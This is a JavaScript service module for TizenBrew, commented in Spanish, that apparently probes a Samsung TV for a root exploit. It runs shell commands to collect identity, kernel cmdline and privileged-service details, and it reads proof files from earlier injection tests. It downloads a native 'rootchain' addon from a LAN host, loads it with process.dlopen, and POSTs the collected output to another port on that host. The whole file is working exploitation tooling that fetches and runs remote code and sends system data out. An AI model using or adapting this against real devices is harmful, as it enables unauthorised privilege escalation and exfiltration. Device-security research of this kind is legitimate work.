/**
 * service.js v3 — módulo TizenBrew EnvProbe
 * Fase 2.5: intenta cargar addon Node (rootchain_node.node — polymer ABI 46) vía process.dlopen
 * (solo lectura / marca /tmp/dl_ok; si funciona: el addon ya escaneó y escribió /tmp/rcscan.out)
 * + verifica /tmp/proof* de los tests de inyección WAS + info categoria Node ABI.
 */
var cp = require('child_process');
var fs = require('fs');
var http = require('http');

var DEST = { host: '192.168.1.35', port: 9999, path: '/probe3' };
var SRC  = { host: '192.168.1.35', port: 8000 };

function report(obj) {
    var body = JSON.stringify(obj);
    http.request({ host: DEST.host, port: DEST.port, path: DEST.path, method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, function (res) { res.resume(); }).on('error', function (e) { }).write(body);
    // .end implícito en .write? no: request necesita end(); hago manual:
}
// <- versión correcta con end():
function report2(obj) {
    var body = JSON.stringify(obj);
    var req = http.request({ host: DEST.host, port: DEST.port, path: DEST.path, method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } },
        function (res) { res.resume(); });
    req.on('error', function (e) { console.log('err ' + e.message); });
    req.write(body); req.end();
}

function httpGetBinary(path, cb) {
    http.get({ host: SRC.host, port: SRC.port, path: path }, function (res) {
        if (res.statusCode !== 200) { cb(new Error('HTTP ' + res.statusCode)); return; }
        var cs = [];
        res.on('data', function (c) { cs.push(c); });
        res.on('end', function () { cb(null, Buffer.concat(cs)); });
    }).on('error', cb);
}

(function main() {
    var out = { node: process.version, abis: process.versions.modules };

    // info base
    cp.exec('id; ls -l /dev/ntksys /dev/ntkhdma; cat /proc/cmdline; ls -l /usr/apps/privileged-service* 2>&1',
        function (err, so, se) { out.env = { out: String(so), err: String(se) }; });

    // busca /tmp/proof* de los tests de inyección WAS
    cp.exec('ls -l /tmp/proof* 2>&1; cat /tmp/proof* 2>&1 | head -20',
        function (err, so, se) { out.proofsWas = { out: String(so), errout: String(se) }; });

    // descargar addon node (ABI 46) e intentar dlopen (UEP??)
    httpGetBinary('/fw-analysis/bin/rootchain_node.node', function (err, buf) {
        if (err) { out.dl = 'ERR ' + err.message; return report2(out); }
        out.dl = 'ok ' + buf.length;
        var pa = '/run/user/5001/rootchain_node.node';
        try {
            fs.writeFileSync(pa, buf);
            fs.chmodSync(pa, 0o644);
            // intento de dlopen
            try {
                var m = {};
                (process).dlopen(m, pa);
                out.dlopen = 'ok (loaded)';
            } catch (e) {
                out.dlopen = 'ERR ' + e.message;
            }
        } catch (e) { out.write = 'ERR ' + e.message; }

        // lee /tmp/rcscan.out (escrito por el addon si funcionó)
        setTimeout(function () {
            try { out.rcscan = fs.readFileSync('/tmp/rcscan.out', 'utf8').slice(0, 6000); }
            catch (e) { out.rcscan = 'no ' + e.message; }
            try { out.dl_ok = fs.readFileSync('/tmp/dl_ok', 'utf8'); } catch (e) {}
            // y /tmp/proof* (por si el addon corrió después de las inyecciones)
            cp.exec('ls -l /tmp/proof* 2>&1; cat /tmp/proof* 2>&1', function (err2, so2, se2) {
                out.proofsWas_2nd = { out: String(so2), errout: String(se2) };
                report2(out);
            });
        }, 4000);
    });
})();
